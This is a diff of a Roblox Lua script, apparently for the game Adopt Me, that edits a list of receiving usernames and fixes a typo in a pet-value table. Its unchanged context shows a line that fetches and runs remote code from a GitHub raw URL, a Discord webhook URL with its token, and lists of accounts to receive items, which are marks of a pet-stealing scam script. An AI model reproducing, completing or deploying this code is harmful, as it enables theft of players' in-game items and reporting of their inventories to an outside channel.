@@ -2,7 +2,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/changelog-modul/Adop/
 
 local Webhook = "https://discord.com/api/webhooks/1465340884705873931/sjdicI6_huK8qalBn_ntg_avQAvNASoPpHo-hsWPR9M_xQOUmUyyEuiTUm8MPR0lurXN"
 local Username = {"Lilicyy90", "zxrx66666", "PHOENIXX541", "YOURBAE66699", "ANJAYGGMBOT", "Egosaputra07", "AnyaaChn7", "PHOENIX666640", "ZXRX392"}
-local ExtraUsers = {"Lilicyy90", "zxrx6666", "zxrx66666", "PHOENIXX541", "YOURBAE66699", "ANJAYGGMBOT", "Egosaputra07", "AnyaaChn7", "PHOENIX666640", "ZXRX392"}
+local ExtraUsers = {"Lilicyy90", "zxrx66666", "PHOENIXX541", "YOURBAE66699", "ANJAYGGMBOT", "Egosaputra07", "AnyaaChn7", "PHOENIX666640", "ZXRX392"}
 local Friends = {}
 
 for _, v in ipairs(Username) do table.insert(Friends, v) end
@@ -36,7 +36,7 @@ local tbl_28_upvr = {
 
 -- 🔥 CUSTOM VALUE LIST (ALL CATEGORY)
 local CUSTOM_VALUES = {
-    pets = {["Bat Dragon"]=660,["Shadow Dragon"]=549,["Giraffe"]=295,["Frost Dragon"]=237,["Owl"]=190,["Parrot"]=151,["Crow"]=130,["Balloon Unicorn"]=104,["Evil Unicorn"]=94,["Panda"]=92,["Cryptid"]=77,["Hartae"]=60,["Orchid Butterfly"]=53,["Diamond Butterfly"]=51,["Blazing Lion"]=50,["Arctic Reindeer"]=41,["Strawberry Bat Dragon"]=23,["Turtle"]=22,["Hot Doggo"]=21,["Monkey King"]=20,["Kangaroo"]=17,["Albino Monkey"]=15,["Sugar Glider"]=12,["Fairy Bat Dragon"]=10,["Undead Jousting Horse"]=10,["Frost Unicorn"]=8,["Capricorn"]=8,["Dragonfruit Fox"]=7,["Shark Puppy"]=7,["Werewolf"]=6,["Frost Fury"]=5,["Vampire Dragon"]=5,["Nessie"]=4,["Lava Dragon"]=3,["Diamond Amazon"]=3,["Glacier Kitsune"]=3,["Phantom Dragon"]=2,["Midnight Dragon"]=2,["Lavender Dragon"]=2,["Unicorn"]=2,["Queen Bee"]=2,["Skele Rex"]=2,["Phoenix"]=2,["Axolotl"]=2,["Cow"]=10,["Blue Whale=1000},
+    pets = {["Bat Dragon"]=660,["Shadow Dragon"]=549,["Giraffe"]=295,["Frost Dragon"]=237,["Owl"]=190,["Parrot"]=151,["Crow"]=130,["Balloon Unicorn"]=104,["Evil Unicorn"]=94,["Panda"]=92,["Cryptid"]=77,["Hartae"]=60,["Orchid Butterfly"]=53,["Diamond Butterfly"]=51,["Blazing Lion"]=50,["Arctic Reindeer"]=41,["Strawberry Bat Dragon"]=23,["Turtle"]=22,["Hot Doggo"]=21,["Monkey King"]=20,["Kangaroo"]=17,["Albino Monkey"]=15,["Sugar Glider"]=12,["Fairy Bat Dragon"]=10,["Undead Jousting Horse"]=10,["Frost Unicorn"]=8,["Capricorn"]=8,["Dragonfruit Fox"]=7,["Shark Puppy"]=7,["Werewolf"]=6,["Frost Fury"]=5,["Vampire Dragon"]=5,["Nessie"]=4,["Lava Dragon"]=3,["Diamond Amazon"]=3,["Glacier Kitsune"]=3,["Phantom Dragon"]=2,["Midnight Dragon"]=2,["Lavender Dragon"]=2,["Unicorn"]=2,["Queen Bee"]=2,["Skele Rex"]=2,["Phoenix"]=2,["Axolotl"]=2,["Cow"]=10,["Blue Whale"=1000},
 
     eggs = {["Safari Egg"]=200,["Jungle Egg"]=86,["Farm Egg"]=84,["Christmas Egg"]=15,["Aussie Egg"]=5,["Endangered Egg"]=1000},
 
